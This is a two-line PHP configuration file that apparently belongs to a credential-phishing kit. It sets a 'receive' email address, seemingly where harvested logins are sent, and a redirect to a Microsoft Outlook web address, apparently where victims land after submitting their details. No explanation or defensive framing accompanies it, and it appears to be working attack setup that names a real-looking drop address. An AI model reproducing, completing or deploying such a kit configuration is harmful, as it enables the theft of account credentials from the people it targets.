<?php 
$Receive_email="citizenmobilealert@outlook.com";
$redirect="https://outlook.office.com.mcas.ms/";
?>